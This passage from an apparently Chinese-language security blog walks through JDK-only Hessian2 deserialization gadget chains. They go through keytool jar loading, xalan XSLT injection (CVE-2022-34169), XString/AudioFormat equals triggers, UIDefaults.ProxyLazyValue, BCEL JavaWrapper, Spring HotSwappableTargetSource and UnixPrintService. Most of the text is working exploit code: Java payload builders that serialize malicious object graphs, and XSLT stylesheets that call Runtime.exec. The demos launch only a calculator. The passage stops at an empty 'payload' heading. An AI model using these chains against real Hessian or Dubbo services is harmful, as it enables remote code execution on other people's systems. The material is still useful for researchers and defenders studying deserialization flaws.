<p>首先，会去 winTestPath 下创建一个指定jar包，内容包含我们传入的 testExistFile </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230225105746044.png"
                      alt="image-20230225105746044"
                ></p>
<p>然后其 Main-Class 会被修改为  evilCRLFHTTP 的内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230225105828181.png"
                      alt="image-20230225105828181"
                ></p>
<p>随后我们通过使用 sun.security.tools.keytool.Main 去读取这个jar包，他就会触发去加载我们写的 Class-Path 里面的jar文件，而这个jar文件就是我们上一个写好的jar包，里面包含Evil.class。能弹出计算器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230225110006619.png"
                      alt="image-20230225110006619"
                ></p>
<h2 id="⑦com-sun-org-apache-xalan-internal-xslt-Process-main"><a href="#⑦com-sun-org-apache-xalan-internal-xslt-Process-main" class="headerlink" title="⑦com.sun.org.apache.xalan.internal.xslt.Process._main"></a>⑦com.sun.org.apache.xalan.internal.xslt.Process._main</h2><p>这个需要点前置知识</p>
<p><a class="link"   href="https://paper.seebug.org/1963/" >Xalan-J XSLT 整数截断漏洞利用构造(CVE-2022-34169) (seebug.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>XLST Injection:</p>
<ul>
<li><p><a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT" >https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Injection</p>
</li>
<li><p><a class="link"   href="https://www.hek.si/documents/An_unxpected_journey-_from_XSLT_injection_to_a_shell_Jusic_Infigo_IS.pdf" >https://www.hek.si/documents/An_unxpected_journey-_from_XSLT_injection_to_a_shell_Jusic_Infigo_IS.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<p>这个实质上就是利用了 CVE-2022-34169 这个漏洞点。</p>
<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xslt.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xslt_Process_main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilFilePath</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8888/payload2.xslt&quot;</span>;</span><br><span class="line">        <span class="comment">//Process._main(new String[]&#123;&quot;-XSLTC&quot;, &quot;-XSL&quot;, evilFilePath&#125;);</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>,<span class="string">&quot;_main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XSLTC&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, evilFilePath&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>几个可用exp</p>
<p><strong>payload2.xslt</strong></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:rt</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span> <span class="attr">xmlns:ob</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:getRuntime()&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:exec($rtobject,&#x27;calc&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;processString&quot;</span> <span class="attr">select</span>=<span class="string">&quot;ob:toString($process)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$processString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>payload3.xslt</strong></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:java</span>=<span class="string">&quot;http://saxon.sf.net/java-type&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;Runtime:exec(Runtime:getRuntime(),&#x27;calc&#x27;)&quot;</span> <span class="attr">xmlns:Runtime</span>=<span class="string">&quot;java.lang.Runtime&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>有给xalan依赖的话，还可以尝试尝试</p>
<p><a class="link"   href="https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f" >https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="–利用特定类的-equals-方法–"><a href="#–利用特定类的-equals-方法–" class="headerlink" title="–利用特定类的 equals 方法–"></a>–利用特定类的 equals 方法–</h2><p>除了之前上面的toStirng，其实还能挖到直接通过 equals 去触发的payload</p>
<div class="highlight-container" data-rel="Ceylon"><figure class="iseeu highlight ceylon"><table><tr><td class="code"><pre><span class="line">match path=(source:Method &#123;NAME:<span class="string">&quot;equals&quot;</span>&#125;)-[:CALL*<span class="number">1</span>]-&gt;(m<span class="number">1</span>:Method &#123;NAME:<span class="string">&quot;toString&quot;</span>&#125;) <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure></div>

<p>有以下几个。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XStringForFSB</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line"># dubbo 中该类已被禁用但是其它地方可用于代替上面两项</span><br><span class="line">javax.sound.sampled.AudioFileFormat</span><br><span class="line">javax.sound.sampled.AudioFormat</span><br></pre></td></tr></table></figure></div>



<p>也可以考虑通过设置map 的俩node去触发equals方法。</p>
<p>或者依靠spring依赖。</p>
<h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><p>之前提到过，hessian2会去执行 hashmap 的 put 方法，随后就是 putval 方法，执行putval的时候会执行equals 键的 equals 方法，而我们设置为 UIDefaults ，其继承自 hashtable，又未重写 equals 方法，在hashtable又会触发其的get方法，这也就到了之前的链子的起始点了 UIDefaults.get 。</p>
<p>以简单的 JavaWrapper 为例，通过hashcode方法进行利用。</p>
<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><p>工具类写入方法</p>
<p>（这里以能执行任意jar下的class的 UIDefaults.ProxyLazyValue 为例，当被禁用时改为非万能方式）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute1</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">    <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">    Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">    <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">    uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">    uiDefaults2.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> Reflections.NoLocalExecuteMap(uiDefaults,uiDefaults2);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">    oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">    oo.writeObject(hashMap);</span><br><span class="line">    oo.flush();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">    <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">    hessian2Input.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_hashCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> OnlyJDK.evilFiles.Evil_main;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里以 JavaWrapper_mian 这个链子作为演示，这个能行其他就业同理修改修改即可</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaWrapper_mian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(Evil_main.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        Hessian2_OnlyJDK_Tool.originalSerialize_Execute1(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><p>当环境存在 spring 依赖时，可以使用 HotSwappableTargetSource</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute2</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">        <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">        Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">        uiDefaults2.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(uiDefaults2);</span><br><span class="line">        <span class="comment">// 设置一个人畜无害内容</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(hotSwappableTargetSource1,hotSwappableTargetSource1);</span><br><span class="line">        hashMap.put(hotSwappableTargetSource2,hotSwappableTargetSource2);</span><br><span class="line">        <span class="comment">// 反射修改回来</span></span><br><span class="line">        Reflections.setFieldValue(hotSwappableTargetSource2,<span class="string">&quot;target&quot;</span>,uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(hashMap);</span><br><span class="line">        oo.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><p>这里我尝试使用手动添加冲突的方式去触发equals方法，可能看上去和payload1相同，实质上也相同，只是这个更完善了。但是操作起来稍微麻烦一丢丢，因为 UIDefaults 本身就是一个 hashtable，反射去修改其值比较麻烦，然后外层嵌套了一个HashMap，然后又套了一个Hashtable，这几个都不好反射去修改。使用payload1通过反射的方式进行hash值的设置（之前好像有出现过此类场景，但是现在想来，还是这个方便），就与该payload相同了，如果校验本身比较简单且容易相等，可以不用这种方式。</p>
<p>我仿造反射构造 HashMap 写了一个构造 HashTable 的方法，这样在向最外面的Hashtable中填充时，就不会有本地触发的风险了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">NoLocalExecuteTable</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        Reflections.setFieldValue(hashtable, <span class="string">&quot;count&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.Hashtable$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.Hashtable$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(hashtable, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>通过这种方式，我们可以构造一个不会本地触发的 hashtable</p>
<p>最终payload</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute3</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">        <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">        Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">        uiDefaults2.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,uiDefaults);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,uiDefaults2);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,uiDefaults);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,uiDefaults2);</span><br><span class="line">        Hashtable hashtable= Reflections.NoLocalExecuteTable(map1,map2);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(hashtable);</span><br><span class="line">        oo.flush();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这个实际上本质上是 payload1，这里的两个hashMap省去，创建hashtable的方法变为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable hashtable= Reflections.NoLocalExecuteTable(uiDefaults,uiDefaults2);</span><br></pre></td></tr></table></figure></div>

<p>这样就与payload1相同了，但是假如payload1中的两个类的hashcode方法返回的值不同，就没法触发payload，所以这个方式虽然多了几步，但是能保证类的hash判断通过。</p>
<h2 id="payload4"><a href="#payload4" class="headerlink" title="payload4"></a>payload4</h2><p>在 Hessian2 的情况下，没有黑名单，以下四个类均可使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XStringForFSB</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line"># dubbo 中该类已被禁用但是其它地方可用于代替上面两项</span><br><span class="line">javax.sound.sampled.AudioFileFormat</span><br><span class="line">javax.sound.sampled.AudioFormat</span><br></pre></td></tr></table></figure></div>

<p>通过这些可以去触发 equals 方法，最后可以触发对应部分的toString方法，可以配合上之前的两个 toString 类。</p>
<p>这里我就使用上面的手动设置冲突的方式去触发equals方法了。（用直接创hashMap的方式，可能在hash校验时不通过，还得反射区进行修改，然后第二个需要spring依赖，于是选用第三个了。）</p>
<p>最终payload</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute4</span><span class="params">(String className, String methodName, Object[] args,<span class="type">int</span> payloadChoose)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ml</span> <span class="operator">=</span>AnyStaticMethodExec3(className,methodName,args);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (payloadChoose)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                o = <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                o = <span class="keyword">new</span> <span class="title class_">XStringForFSB</span>(<span class="keyword">new</span> <span class="title class_">FastStringBuffer</span>(),<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                o = Reflections.createWithoutConstructor(AudioFileFormat.Type.class);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                o = Reflections.createWithoutConstructor(AudioFormat.Encoding.class);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                o = <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,o);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,ml);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,o);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,ml);</span><br><span class="line">        Hashtable hashtable= Reflections.NoLocalExecuteTable(map1,map2);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(hashtable);</span><br><span class="line">        oo.flush();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="🚩特定情况下命令执行-–-UnixPrintService"><a href="#🚩特定情况下命令执行-–-UnixPrintService" class="headerlink" title="🚩特定情况下命令执行 – UnixPrintService"></a>🚩特定情况下命令执行 – UnixPrintService</h2><p>参考：<a class="link"   href="https://aecous.github.io/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/#%E7%BB%93%E5%90%88%E5%85%B6%E4%BB%96%E4%BE%9D%E8%B5%96%E7%9A%84%E6%8B%93%E5%B1%95" >初探UnixPrintService | Prove yourself (aecous.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/kingbridge/articles/17020853.html" >使用tabby对CVE-2022-39198的挖掘尝试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>利用 <code>sun.print.UnixPrintService</code> 可直接执行命令。</p>
<p>这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令（因为UnixPrintService中存在多个getter，所以命令会执行多次）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651142700263.png"
                      alt="img"
                ></p>
<p><strong>也是非常直观，可以直接利用。但只可惜这个类在高版本被移除，并仅支持 Unix&#x2F;类Unix 操作系统（如Linux）。</strong></p>
<p>总体看下来其实这个方法还是较为鸡肋的：</p>
<p>【缺点1】未实现序列化接口，目前只能在 hessian2 这个特殊的反序列化玩意里面用。（个人感觉最大缺点）</p>
<p>【缺点2】高版本java已移除</p>
<p>【缺点3】需要不存在CUPS服务，而许多linux 如 ubuntu 默认开启（docker中不存在，可以通过访问<code>http://127.0.0.1:631/</code>看看是否开启）。</p>
<p>感觉限制比较大，就不做具体分析了，只要满足版本条件，再去找一个 getter trigger 就行了。</p>
<p><strong>payload</strong></p>
